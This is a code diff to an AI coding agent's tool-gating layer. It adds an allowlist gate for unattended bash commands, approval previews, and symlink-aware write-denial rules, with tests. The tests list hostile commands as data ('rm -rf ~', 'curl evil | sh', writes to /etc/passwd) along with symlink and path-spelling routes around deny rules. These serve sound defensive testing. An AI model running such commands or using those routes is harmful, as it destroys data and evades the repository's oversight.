@@ -56,6 +56,16 @@ pub trait ToolGate: Send + Sync {
     fn human_decided(&self) -> bool {
         false
     }
+
+    /// The name a denial by this gate is recorded under in the trail, or
+    /// `None` for a gate whose denials the trail does not list separately.
+    ///
+    /// Governance and approval return `None`: a governance refusal is in the
+    /// call's own observation, and an approval is already its own action.
+    /// The pre_tool hook and the bash policy name themselves (ADR 0023 §7).
+    fn name(&self) -> Option<&'static str> {
+        None
+    }
 }
 
 /// `[governance] deny_write` and the rule documents' write denials, as the
@@ -65,26 +75,45 @@ pub trait ToolGate: Send + Sync {
 /// `edit` is refused, the refusal names the rule as written, and it is made
 /// before the file is read, so a denied path is refused identically whether
 /// or not it exists.
-pub struct GovernanceGate(pub Governance);
+///
+/// Holds the root because a rule binds the path a write lands on, not the
+/// string the model wrote: `lnk/x.py` through a committed link to
+/// `vendor/` is a write to `vendor/x.py` ([`Governance::denies_write_at`]).
+pub struct GovernanceGate {
+    governance: Governance,
+    root: PathBuf,
+}
+
+impl GovernanceGate {
+    pub fn new(governance: Governance, root: &Path) -> Self {
+        Self {
+            governance,
+            root: root.to_path_buf(),
+        }
+    }
+}
 
 impl ToolGate for GovernanceGate {
     fn check<'a>(&'a mut self, call: &'a ToolCall) -> GateFuture<'a> {
         let decision = match call {
-            ToolCall::Edit { path, .. } => match self.0.denies_write(path) {
-                Some(rule) => GateDecision::Deny {
-                    reason: format!(
-                        concat!(
-                            "edit refused: `{}` is denied by the rule `{}` in ",
-                            ".trellis/config.toml. This is the repository's own rule, ",
-                            "not a guess — change the rule if the file really should be ",
-                            "editable."
+            ToolCall::Edit { path, .. } | ToolCall::WriteFile { path, .. } => {
+                match self.governance.denies_write_at(&self.root, path) {
+                    Some(rule) => GateDecision::Deny {
+                        reason: format!(
+                            concat!(
+                                "{} refused: `{}` is denied by the rule `{}` in ",
+                                ".trellis/config.toml. This is the repository's own rule, ",
+                                "not a guess — change the rule if the file really should be ",
+                                "editable."
+                            ),
+                            tool_name(call),
+                            path,
+                            rule.as_written()
                         ),
-                        path,
-                        rule.as_written()
-                    ),
-                },
-                None => GateDecision::Allow,
-            },
+                    },
+                    None => GateDecision::Allow,
+                }
+            }
             _ => GateDecision::Allow,
         };
         Box::pin(std::future::ready(decision))
@@ -94,23 +123,41 @@ impl ToolGate for GovernanceGate {
 /// The tool names a `[control] approve` list may contain.
 ///
 /// `read_skill` is here because ADR 0019 added the tool after ADR 0018 listed
-/// the approvable ones. It is read-only, like `read_file`.
+/// the approvable ones. It is read-only, like `read_file`. The last five are
+/// ADR 0023's built-ins. A repository's own tools are approvable by name too,
+/// and `[control] approve` is checked against those where it is read.
 pub const APPROVABLE_TOOLS: &[&str] = &[
     "edit",
     "read_file",
     "run_checks",
     "blast_radius",
     "read_skill",
+    "write_file",
+    "grep",
+    "find",
+    "ls",
+    "bash",
+    "search_notes",
+    "read_note",
 ];
 
-/// The tool name a call is listed under in `[control] approve`.
-pub fn tool_name(call: &ToolCall) -> &'static str {
+/// The tool name a call is listed under in `[control] approve`, `[tools]`,
+/// and the trail.
+pub fn tool_name(call: &ToolCall) -> &str {
     match call {
         ToolCall::BlastRadius { .. } => "blast_radius",
         ToolCall::ReadFile { .. } => "read_file",
         ToolCall::Edit { .. } => "edit",
         ToolCall::RunChecks { .. } => "run_checks",
         ToolCall::ReadSkill { .. } => "read_skill",
+        ToolCall::WriteFile { .. } => "write_file",
+        ToolCall::Grep { .. } => "grep",
+        ToolCall::Find { .. } => "find",
+        ToolCall::Ls { .. } => "ls",
+        ToolCall::Bash { .. } => "bash",
+        ToolCall::SearchNotes { .. } => "search_notes",
+        ToolCall::ReadNote { .. } => "read_note",
+        ToolCall::Custom { name, .. } => name,
     }
 }
 
@@ -175,6 +222,35 @@ impl ToolGate for ApprovalGate {
                         None => return GateDecision::Allow,
                     }
                 }
+                // A new file is shown whole, since all of it is the change.
+                // A path that already exists is refused by the orchestrator
+                // in its own words, so it is not put to the human either.
+                ToolCall::WriteFile { path, content } => {
+                    // The orchestrator's own predicates, in its order, so
+                    // the two cannot disagree about which calls go unasked:
+                    // the path rules, an existing file, and git's ignore
+                    // rules (one `git check-ignore`, only when the others
+                    // pass, as in `write_file`).
+                    let refused = crate::orchestrator::write_refusal(&self.root, path).is_some()
+                        || self.root.join(path).exists()
+                        || crate::orchestrator::ignored_refusal(&self.root, path)
+                            .await
+                            .is_some();
+                    if refused {
+                        return GateDecision::Allow;
+                    }
+                    let mut diff = format!("+++ {path} (new file)\n");
+                    for l in content.lines() {
+                        diff.push_str(&format!("+ {l}\n"));
+                    }
+                    (
+                        format!("write_file {path} (+{} new)", content.lines().count()),
+                        diff,
+                    )
+                }
+                // The command in full: a person approving a shell command
+                // has to see all of it, not a label cut at the first line.
+                ToolCall::Bash { command } => ("bash".to_string(), command.clone()),
                 other => (label(other), String::new()),
             };
             let (reply, rx) = oneshot::channel();
@@ -210,7 +286,8 @@ impl ToolGate for ApprovalGate {
     }
 }
 
-fn label(call: &ToolCall) -> String {
+/// A call in a few words, for a question, a log line or the trail.
+pub(crate) fn label(call: &ToolCall) -> String {
     match call {
         ToolCall::BlastRadius { symbol } => format!("blast_radius {symbol}"),
         ToolCall::ReadFile { path } => format!("read_file {path}"),
@@ -224,6 +301,109 @@ fn label(call: &ToolCall) -> String {
             }
         }
         ToolCall::ReadSkill { name } => format!("read_skill {name}"),
+        ToolCall::WriteFile { path, .. } => format!("write_file {path}"),
+        ToolCall::Grep { pattern, path } => match path {
+            Some(p) => format!("grep {pattern} in {p}"),
+            None => format!("grep {pattern}"),
+        },
+        ToolCall::Find { glob } => format!("find {glob}"),
+        ToolCall::Ls { path } => format!("ls {path}"),
+        ToolCall::Bash { command } => format!("bash {}", first_line(command)),
+        ToolCall::SearchNotes { query, .. } => format!("search_notes {}", first_line(query)),
+        ToolCall::ReadNote { note } => format!("read_note {note}"),
+        ToolCall::Custom { name, args } => format!("{name} {args}"),
+    }
+}
+
+/// The first non-blank line of a command, cut to 120 characters, for a
+/// label, and how many non-blank lines follow it. The approval question
+/// shows the whole command; a label is a summary. Not simply the first
+/// line: a command that opens with a newline was labelled `…`, which says
+/// nothing about what ran.
+pub(crate) fn first_line(s: &str) -> String {
+    let mut lines = s.lines().filter(|l| !l.trim().is_empty());
+    let line = lines.next().unwrap_or("").trim_end();
+    let mut out: String = line.chars().take(120).collect();
+    if out.len() < line.len() {
+        out.push('…');
+    }
+    match lines.count() {
+        0 => {}
+        1 => out.push_str(" [+1 more line]"),
+        n => out.push_str(&format!(" [+{n} more lines]")),
+    }
+    out
+}
+
+/// What makes a command more than one command, or sends its output
+/// somewhere: a `bash_allow` prefix never admits a command containing one.
+const SHELL_META: &[&str] = &[";", "&", "|", "`", "$(", "<", ">", "\n", "\r"];
+
+/// `[tools] bash` in a run nobody is watching (ADR 0023 §3).
+///
+/// Installed in auto mode only. In approve mode `bash` is on the approve list
+/// and a person sees every command in full.
+pub struct BashPolicyGate {
+    allow: Vec<String>,
+    unattended: bool,
+}
+
+impl BashPolicyGate {
+    pub fn new(allow: Vec<String>, unattended: bool) -> Self {
+        Self { allow, unattended }
+    }
+
+    /// Whether `command` may run with nobody watching.
+    ///
+    /// A prefix admits only a simple command at a word boundary:
+    /// `cargo test && rm -rf ~` starts with `cargo test`, and a list of
+    /// prefixes that admitted it would be a list of ways to run anything.
+    pub fn admits(&self, command: &str) -> bool {
+        if self.unattended {
+            return true;
+        }
+        let c = command.trim();
+        if SHELL_META.iter().any(|m| c.contains(m)) {
+            return false;
+        }
+        self.allow.iter().any(|p| {
+            let p = p.trim();
+            !p.is_empty()
+                && c.starts_with(p)
+                && (c.len() == p.len() || c[p.len()..].starts_with(' '))
+        })
+    }
+}
+
+impl ToolGate for BashPolicyGate {
+    fn check<'a>(&'a mut self, call: &'a ToolCall) -> GateFuture<'a> {
+        let decision = match call {
+            ToolCall::Bash { command } if !self.admits(command) => GateDecision::Deny {
+                // The settings first: the trail keeps the first 120
+                // characters of this, and they are what a reader acts on.
+                reason: format!(
+                    concat!(
+                        "bash refused: not admitted by [tools] bash_allow ({}) or ",
+                        "bash_unattended in an auto-mode run nobody is watching. Only a ",
+                        "simple command (no ; & | ` $( < > or newline) that starts with a ",
+                        "bash_allow entry runs; or set bash_unattended = true, or run in ",
+                        "approve mode. The command was `{}`."
+                    ),
+                    if self.allow.is_empty() {
+                        "empty".to_string()
+                    } else {
+                        self.allow.join(", ")
+                    },
+                    first_line(command),
+                ),
+            },
+            _ => GateDecision::Allow,
+        };
+        Box::pin(std::future::ready(decision))
+    }
+
+    fn name(&self) -> Option<&'static str> {
+        Some("bash_policy")
     }
 }
 
@@ -242,11 +422,12 @@ pub struct EditPreview {
 /// or a Windows checkout would preview as "anchor not found" an edit that
 /// then applies.
 pub fn preview_edit(root: &Path, path: &str, old: &str, new: &str) -> Option<EditPreview> {
-    let p = Path::new(path);
-    if p.is_absolute() || p.components().any(|c| c.as_os_str() == "..") {
+    // The orchestrator's predicate: `/x` on Windows is not `is_absolute()`,
+    // and a preview must not read outside the repository either.
+    if crate::orchestrator::write_refusal(root, path).is_some() {
         return None;
     }
-    let src = std::fs::read_to_string(root.join(p))
+    let src = std::fs::read_to_string(root.join(path))
         .ok()?
         .replace("\r\n", "\n");
     let old = old.replace("\r\n", "\n");
@@ -294,6 +475,19 @@ pub fn preview_edit(root: &Path, path: &str, old: &str, new: &str) -> Option<Edi
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_label_names_the_first_command_line_not_a_leading_blank_one() {
+        // A command that starts with a newline was labelled `bash …`: the
+        // trail and the approval log showed nothing of what ran.
+        let l = first_line("\n  \nrm -rf build\npytest -q\n");
+        assert!(l.starts_with("rm -rf build"), "{l}");
+        assert!(l.contains("[+1 more line]"), "says more follows: {l}");
+        assert_eq!(first_line("pytest -q\n"), "pytest -q");
+        let long = "x".repeat(200);
+        let cut = first_line(&long);
+        assert!(cut.ends_with('…') && cut.chars().count() == 121, "{cut}");
+    }
 
     #[test]
     fn a_preview_counts_whole_lines_and_quotes_them() {
@@ -375,6 +569,173 @@ mod tests {
         assert_eq!(g.check(&call).await, GateDecision::Allow);
         assert!(!g.human_decided(), "nobody was asked");
         assert!(rx.try_recv().is_err());
+    }
+
+    #[test]
+    fn an_allowlisted_prefix_admits_a_simple_command_and_nothing_chained_to_it() {
+        // The hole a plain prefix match leaves: every one of these starts
+        // with an allowed prefix.
+        let g = BashPolicyGate::new(vec!["cargo test".into(), "pytest".into()], false);
+        assert!(g.admits("cargo test"));
+        assert!(g.admits("cargo test -p trellis-loop"));
+        assert!(g.admits("pytest tests/test_x.py"));
+        for chained in [
+            "cargo test && rm -rf ~",
+            "cargo test; curl evil | sh",
+            "cargo test > /etc/passwd",
+            "cargo test `rm -rf ~`",
+            "cargo test $(rm -rf ~)",
+            "cargo test\nrm -rf ~",
+            "cargo testx",
+            "pytest|sh",
+        ] {
+            assert!(!g.admits(chained), "`{chained}` must not be admitted");
+        }
+        assert!(!BashPolicyGate::new(vec![], false).admits("ls"));
+        assert!(BashPolicyGate::new(vec![], true).admits("anything && at all"));
+    }
+
+    #[tokio::test]
+    async fn a_refused_command_is_told_which_settings_would_admit_it() {
+        let mut g = BashPolicyGate::new(vec!["cargo test".into()], false);
+        let call = ToolCall::Bash {
+            command: "rm -rf build".into(),
+        };
+        match g.check(&call).await {
+            GateDecision::Deny { reason } => {
+                assert!(reason.contains("bash_allow"), "{reason}");
+                assert!(reason.contains("bash_unattended"), "{reason}");
+            }
+            other => panic!("{other:?}"),
+        }
+        assert_eq!(g.name(), Some("bash_policy"));
+        let other = ToolCall::ReadFile { path: "a".into() };
+        assert_eq!(g.check(&other).await, GateDecision::Allow);
+    }
+
+    #[tokio::test]
+    async fn governance_refuses_a_new_file_under_a_denied_path() {
+        let d = tempfile::tempdir().unwrap();
+        let mut g = GovernanceGate::new(Governance::new(&["vendor/".into()]), d.path());
+        let call = ToolCall::WriteFile {
+            path: "vendor/new.py".into(),
+            content: "x = 1\n".into(),
+        };
+        match g.check(&call).await {
+            GateDecision::Deny { reason } => {
+                assert!(reason.starts_with("write_file refused"), "{reason}")
+            }
+            other => panic!("deny_write must cover created files: {other:?}"),
+        }
+    }
+
+    /// A git repository with `vendor/` in it and `lnk` a link to it, or
+    /// `None` where this platform will not make the link.
+    fn repo_with_link_to_vendor() -> Option<tempfile::TempDir> {
+        let d = tempfile::tempdir().unwrap();
+        std::process::Command::new("git")
+            .args(["init", "-q"])
+            .current_dir(d.path())
+            .output()
+            .unwrap();
+        std::fs::create_dir_all(d.path().join("vendor")).unwrap();
+        std::fs::write(d.path().join("vendor/a.py"), "x = 1\n").unwrap();
+        #[cfg(unix)]
+        std::os::unix::fs::symlink("vendor", d.path().join("lnk")).ok()?;
+        // A junction needs no privilege, unlike a Windows symlink.
+        #[cfg(windows)]
+        {
+            let made = std::process::Command::new("cmd")
+                .args(["/C", "mklink", "/J", "lnk", "vendor"])
+                .current_dir(d.path())
+                .output()
+                .ok()?;
+            if !made.status.success() {
+                return None;
+            }
+        }
+        Some(d)
+    }
+
+    async fn write_under(root: &Path, path: &str) -> crate::ToolResult {
+        let (h, _j) =
+            crate::orchestrator::Orchestrator::new(root, trellis_checks::CheckConfig::default())
+                .with_governance(Governance::new(&["vendor/".into(), "setup.py".into()]))
+                .with_tools(
+                    crate::ToolSet::build(crate::ToolSelection {
+                        enable: vec!["write_file".into()],
+                        ..Default::default()
+                    })
+                    .unwrap(),
+                )
+                .spawn();
+        h.call(&ToolCall::WriteFile {
+            path: path.into(),
+            content: "x = 2\n".into(),
+        })
+        .await
+        .result
+    }
+
+    #[tokio::test]
+    async fn deny_write_holds_for_the_path_a_write_really_lands_on() {
+        // The risk: `deny_write` was matched against the model's string,
+        // so a write through a committed link, or spelt `.//vendor/x.py`,
+        // landed in the protected directory unrefused.
+        let Some(d) = repo_with_link_to_vendor() else {
+            eprintln!("skipped: no link on this platform");
+            return;
+        };
+        for p in ["lnk/new.py", ".//vendor/new.py", ".//setup.py"] {
+            let got = write_under(d.path(), p).await;
+            assert!(
+                matches!(&got, crate::ToolResult::Error(e) if e.contains("denied by the rule")),
+                "{p}: {got:?}"
+            );
+        }
+        assert!(!d.path().join("vendor/new.py").exists());
+        assert!(!d.path().join("setup.py").exists());
+        // An ordinary path is still written.
+        let got = write_under(d.path(), "app.py").await;
+        assert!(!matches!(got, crate::ToolResult::Error(_)), "{got:?}");
+    }
+
+    #[tokio::test]
+    async fn a_write_file_git_ignores_is_not_put_to_the_human() {
+        // The risk: the gate predicted every write_file refusal but the
+        // git-ignored one, so a person was asked to approve a write the
+        // orchestrator then refused. The prediction asks git the same
+        // question, the same way.
+        let d = tempfile::tempdir().unwrap();
+        std::process::Command::new("git")
+            .args(["init", "-q"])
+            .current_dir(d.path())
+            .output()
+            .unwrap();
+        std::fs::write(d.path().join(".gitignore"), "*.log\n").unwrap();
+        let (tx, mut rx) = mpsc::channel(1);
+        let mut g = ApprovalGate::new(d.path(), vec!["write_file".into()], tx);
+        let call = ToolCall::WriteFile {
+            path: "debug.log".into(),
+            content: "x\n".into(),
+        };
+        // Bounded: a gate that asks waits for a reply nobody sends here.
+        let d2 = tokio::time::timeout(std::time::Duration::from_secs(5), g.check(&call)).await;
+        assert!(rx.try_recv().is_err(), "the person was asked");
+        assert_eq!(d2, Ok(GateDecision::Allow));
+        assert!(!g.human_decided(), "nobody was asked");
+
+        // A path git would track is still put to the human.
+        let (tx, mut rx) = mpsc::channel(1);
+        let mut g = ApprovalGate::new(d.path(), vec!["write_file".into()], tx);
+        let call = ToolCall::WriteFile {
+            path: "new.py".into(),
+            content: "x = 1\n".into(),
+        };
+        let asked = tokio::spawn(async move { rx.recv().await.map(|r| r.question) });
+        let _ = tokio::time::timeout(std::time::Duration::from_millis(500), g.check(&call)).await;
+        let q = asked.await.unwrap().expect("asked");
+        assert!(q.contains("write_file new.py"), "{q}");
     }
 
     #[tokio::test]
